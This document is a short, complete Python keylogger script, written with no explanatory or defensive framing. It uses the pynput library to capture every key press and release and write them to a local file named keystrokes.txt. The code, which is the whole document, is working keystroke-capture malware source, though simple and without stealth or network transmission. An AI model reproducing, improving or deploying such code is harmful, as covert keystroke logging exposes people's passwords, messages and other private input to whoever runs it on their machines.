from pynput import keyboard
import time

# Create a file to store the keystrokes
file = open("keystrokes.txt", "w")

def on_key_press(key):
    file.write(str(key))
    file.write("\n")

def on_key_release(key):
    file.write("{0} release".format(str(key)))
    file.write("\n")

# Start the keylogger
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

# Close the file
file.close()

print("Keystrokes saved to keystrokes.txt")